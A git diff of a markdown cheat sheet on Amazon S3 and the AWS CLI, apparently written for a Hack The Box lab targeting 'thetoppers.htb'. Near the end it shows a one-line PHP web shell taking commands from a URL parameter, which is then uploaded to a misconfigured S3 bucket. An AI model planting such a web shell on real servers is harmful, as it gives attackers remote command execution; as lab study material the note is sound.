@@ -1,11 +1,13 @@
 # Amazon
 
 ## Content
-- []()
-- []()
-- []()
-- []()
-- []()
+- [AWS]()
+- [Amazon S3]()
+- [awscli]()
+  - [Install]()
+  - [Configure]()
+  - [List S3 Objects]()
+  - [Copy Files to an S3 Bucket]()
 
 ----
 ## [AWS](https://aws.amazon.com/)
@@ -22,7 +24,8 @@
   - An [objects](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingObjects.html) is a file and any metadata that describes the file.
     - Objects are the fundamental entities stored in Amazon S3.
     - Each object can be up to 5 TB in size.
-  - A _[bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html)_ is a container for objects. 
+  - A _[bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html)_ is a container for objects.
+- If you access an S3 subdomain (e.g., `http://s3.thetoppers.htb`) and you see the json key:value pair: `{"status": "running"}`, you know you're dealing with an active S3 storage service.
 
 ## [awscli](https://aws.amazon.com/cli/)
 > The AWS Command Line Interface (AWS CLI) is a unified tool to manage your AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.
@@ -37,7 +40,7 @@ apt install awscli
 ```
 aws configure
 ```
-- When prompted, just use an arbitrary value for the responses to the required values (e.g., "temp"). 
+- When prompted, just use an arbitrary values (e.g., "temp") for the responses to the required fields. 
 
 ### List S3 Objects
 - Use the `ls` command to list the objects and common prefixes under (in) the specified bucket:
@@ -56,6 +59,7 @@ aws --endpoint=http://s3.[domain name] s3 ls s3://[domain name]
 ```
 # create a PHP file to upload
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
 # upload that file with awscli
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
